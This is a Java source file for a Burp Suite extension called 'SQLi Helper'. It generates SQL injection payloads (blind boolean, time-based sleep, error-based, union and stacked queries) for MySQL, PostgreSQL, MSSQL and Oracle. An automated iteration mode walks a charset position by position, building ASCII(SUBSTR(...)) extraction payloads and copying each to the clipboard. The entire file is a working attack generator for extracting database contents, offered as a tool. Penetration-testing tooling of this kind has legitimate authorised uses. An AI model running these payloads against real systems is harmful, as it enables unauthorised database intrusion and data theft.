package com.example.sqli;

import burp.api.montoya.BurpExtension;
import burp.api.montoya.MontoyaApi;
import burp.api.montoya.core.Registration;
import burp.api.montoya.ui.UserInterface;

import javax.swing.*;
import java.awt.*;
import java.awt.datatransfer.StringSelection;

public class MontoyaExtension implements BurpExtension {
    private JPanel panel;
    private javax.swing.SwingWorker<Void, String> iterWorker;

    @Override
    public void initialize(MontoyaApi montoyaApi) {
        montoyaApi.extension().setName("SQLi Helper");

        SwingUtilities.invokeLater(() -> {
            panel = new JPanel(new BorderLayout());
            JPanel input = new JPanel(new GridBagLayout());
            GridBagConstraints c = new GridBagConstraints();
            c.insets = new Insets(4,4,4,4);
            c.anchor = GridBagConstraints.WEST;
            int row = 0;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Table:"), c);
            c.gridx = 1; JTextField tableField = new JTextField(20); input.add(tableField, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Column:"), c);
            c.gridx = 1; JTextField columnField = new JTextField(20); input.add(columnField, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Injection type:"), c);
            c.gridx = 1; JComboBox<String> typeBox = new JComboBox<>(new String[]{"Boolean (blind)", "Time-based (sleep)", "Error-based", "Union-based", "Stacked/Multiple"}); input.add(typeBox, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("DBMS:"), c);
            c.gridx = 1; JComboBox<String> dbmsBox = new JComboBox<>(new String[]{"MySQL", "PostgreSQL", "MSSQL", "Oracle", "Generic"}); input.add(dbmsBox, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Row offset (LIMIT):"), c);
            c.gridx = 1; JTextField offsetField = new JTextField("0", 5); input.add(offsetField, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Position (char index):"), c);
            c.gridx = 1; JTextField posField = new JTextField("1", 5); input.add(posField, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Custom condition (optional):"), c);
            c.gridx = 1; JTextField condField = new JTextField(20); input.add(condField, c);
            row++;

            // Iteration controls
            c.gridx = 0; c.gridy = row; input.add(new JLabel("Charset:"), c);
            c.gridx = 1; JTextField charsetField = new JTextField("abcdefghijklmnopqrstuvwxyz0123456789", 20); input.add(charsetField, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Max position:"), c);
            c.gridx = 1; JTextField maxPosField = new JTextField("8", 5); input.add(maxPosField, c);
            row++;

            c.gridx = 0; c.gridy = row; input.add(new JLabel("Delay ms between payloads:"), c);
            c.gridx = 1; JTextField delayField = new JTextField("500", 6); input.add(delayField, c);
            row++;

            c.gridx = 0; c.gridy = row; JButton startIter = new JButton("Start Iteration"); input.add(startIter, c);
            c.gridx = 1; JButton stopIter = new JButton("Stop"); input.add(stopIter, c);
            row++;

            c.gridx = 0; c.gridy = row; JButton genButton = new JButton("Generate"); input.add(genButton, c);

            panel.add(input, BorderLayout.NORTH);

            JTextArea output = new JTextArea(10, 60);
            output.setLineWrap(true); output.setWrapStyleWord(true);
            panel.add(new JScrollPane(output), BorderLayout.CENTER);

            JButton copyBtn = new JButton("Copy"); JPanel bottom = new JPanel(); bottom.add(copyBtn); panel.add(bottom, BorderLayout.SOUTH);

            genButton.addActionListener(e -> {
                String table = tableField.getText().trim();
                String column = columnField.getText().trim();
                String type = (String) typeBox.getSelectedItem();
                int offset = parseInt(offsetField.getText().trim(), 0);
                int pos = parseInt(posField.getText().trim(), 1);
                String cond = condField.getText().trim();
                if (table.isEmpty() || column.isEmpty()) { JOptionPane.showMessageDialog(panel, "Table and column required"); return; }
                String dbms = (String) dbmsBox.getSelectedItem();
                String payload = generatePayload(table, column, type, offset, pos, cond, dbms, null);
                output.setText(payload);
            });

            startIter.addActionListener(e -> {
                if (iterWorker != null && !iterWorker.isDone()) {
                    JOptionPane.showMessageDialog(panel, "Iteration already running");
                    return;
                }
                String table = tableField.getText().trim();
                String column = columnField.getText().trim();
                if (table.isEmpty() || column.isEmpty()) { JOptionPane.showMessageDialog(panel, "Table and column required"); return; }
                String type = (String) typeBox.getSelectedItem();
                String dbms = (String) dbmsBox.getSelectedItem();
                int offset = parseInt(offsetField.getText().trim(), 0);
                int maxPos = parseInt(maxPosField.getText().trim(), 8);
                String charset = charsetField.getText();
                int delay = parseInt(delayField.getText().trim(), 500);

                iterWorker = new javax.swing.SwingWorker<Void, String>() {
                    @Override
                    protected Void doInBackground() throws Exception {
                        for (int p = 1; p <= maxPos && !isCancelled(); p++) {
                            for (int i = 0; i < charset.length() && !isCancelled(); i++) {
                                char ch = charset.charAt(i);
                                int ascii = (int) ch;
                                String payload = generatePayload(table, column, type, offset, p, "", dbms, Integer.valueOf(ascii));
                                publish(payload);
                                try { Thread.sleep(delay); } catch (InterruptedException ex) { return null; }
                            }
                        }
                        return null;
                    }

                    @Override
                    protected void process(java.util.List<String> chunks) {
                        if (chunks == null || chunks.isEmpty()) return;
                        String last = chunks.get(chunks.size()-1);
                        output.setText(last);
                        // copy to clipboard each iteration
                        StringSelection sel = new StringSelection(last);
                        Toolkit.getDefaultToolkit().getSystemClipboard().setContents(sel, null);
                    }

                    @Override
                    protected void done() {
                        JOptionPane.showMessageDialog(panel, "Iteration finished");
                    }
                };
                iterWorker.execute();
            });

            stopIter.addActionListener(e -> {
                if (iterWorker != null && !iterWorker.isDone()) {
                    iterWorker.cancel(true);
                    JOptionPane.showMessageDialog(panel, "Stopping iteration...");
                }
            });

            copyBtn.addActionListener(e -> {
                String text = output.getText();
                if (text == null || text.isEmpty()) { JOptionPane.showMessageDialog(panel, "Nothing to copy"); return; }
                StringSelection sel = new StringSelection(text);
                Toolkit.getDefaultToolkit().getSystemClipboard().setContents(sel, null);
                JOptionPane.showMessageDialog(panel, "Copied to clipboard");
            });

            // Register the panel as a suite tab in Burp via Montoya
            UserInterface ui = montoyaApi.userInterface();
            Registration reg = ui.registerSuiteTab("SQLi Helper", panel);
            // reg can be stored if you want to unregister later
        });
    }

    private int parseInt(String s, int def) { try { return Integer.parseInt(s); } catch (Exception e) { return def; } }

    private String generatePayload(String table, String column, String type, int offset, int pos, String cond, String dbms, Integer asciiOverride) {
        // Reuse the same generator logic as the legacy implementation
        String baseSelect;
        if ("PostgreSQL".equalsIgnoreCase(dbms)) {
            baseSelect = String.format("(SELECT %s FROM %s LIMIT 1 OFFSET %d)", column, table, offset);
        } else if ("MSSQL".equalsIgnoreCase(dbms)) {
            baseSelect = String.format("(SELECT %s FROM %s ORDER BY (SELECT NULL) OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY)", column, table, offset);
        } else if ("Oracle".equalsIgnoreCase(dbms)) {
            int row = offset + 1;
            baseSelect = String.format("(SELECT %s FROM (SELECT %s, ROWNUM rnum FROM %s WHERE ROWNUM <= %d) WHERE rnum = %d)", column, column, table, row, row);
        } else {
            baseSelect = String.format("(SELECT %s FROM %s LIMIT %d,1)", column, table, offset);
        }

        String condExp;
        if (asciiOverride != null) {
            condExp = String.format("ASCII(SUBSTR(%s,%d,1))=%d", baseSelect, pos, asciiOverride.intValue());
        } else if (cond != null && !cond.isEmpty()) {
            condExp = cond;
        } else {
            condExp = String.format("ASCII(SUBSTR(%s,%d,1))=%d", baseSelect, pos, (int) 'a');
        }

        String sleepExpr;
        if ("PostgreSQL".equalsIgnoreCase(dbms)) {
            sleepExpr = "pg_sleep(5)";
        } else if ("MSSQL".equalsIgnoreCase(dbms)) {
            sleepExpr = "WAITFOR DELAY '0:0:5'";
        } else if ("Oracle".equalsIgnoreCase(dbms)) {
            sleepExpr = "dbms_lock.sleep(5)";
        } else {
            sleepExpr = "SLEEP(5)";
        }

        if (type != null && type.contains("Time")) {
            if ("MSSQL".equalsIgnoreCase(dbms) || "Oracle".equalsIgnoreCase(dbms)) {
                return String.format("' OR (CASE WHEN (%s) THEN %s ELSE 0 END)-- ", condExp, sleepExpr);
            }
            return String.format("' OR IF(%s, %s, 0)-- ", condExp, sleepExpr);
        } else if (type != null && type.contains("Error")) {
            if ("MySQL".equalsIgnoreCase(dbms) || "Generic".equalsIgnoreCase(dbms)) {
                return String.format("' AND updatexml(1,concat(0x3a,(%s)),1)-- ", baseSelect);
            } else if ("PostgreSQL".equalsIgnoreCase(dbms)) {
                return String.format("' OR (SELECT CASE WHEN (%s) THEN to_char(1/0) ELSE NULL END)-- ", condExp);
            } else if ("Oracle".equalsIgnoreCase(dbms)) {
                return String.format("' AND to_number((%s))=1-- ", baseSelect);
            } else {
                return "-- Error-based template: adapt for your DBMS --" + System.lineSeparator() + String.format("(value) FROM %s", table);
            }
        } else if (type != null && type.contains("Union")) {
            if ("PostgreSQL".equalsIgnoreCase(dbms)) {
                return String.format("' UNION SELECT <col1>, %s, <colN> FROM %s LIMIT 1 OFFSET %d-- ", baseSelect, table, offset);
            }
            return String.format("' UNION SELECT <col1>, %s, <colN> FROM %s LIMIT %d,1-- ", baseSelect, table, offset);
        } else if (type != null && type.contains("Stacked")) {
            if ("MSSQL".equalsIgnoreCase(dbms)) {
                return String.format("'; %s; -- ", String.format("SELECT %s FROM %s ORDER BY (SELECT NULL) OFFSET %d ROWS FETCH NEXT 1 ROWS ONLY", column, table, offset));
            } else if ("Oracle".equalsIgnoreCase(dbms)) {
                return String.format("'; %s; -- ", String.format("SELECT %s FROM %s WHERE ROWNUM = 1 AND ROWNUM <= %d", column, table, offset+1));
            }
            return String.format("'; SELECT %s FROM %s LIMIT %d,1; -- ", column, table, offset);
        } else {
            return String.format("' OR (CASE WHEN (%s) THEN 1 ELSE 0 END)=1-- ", condExp);
        }
    }
}
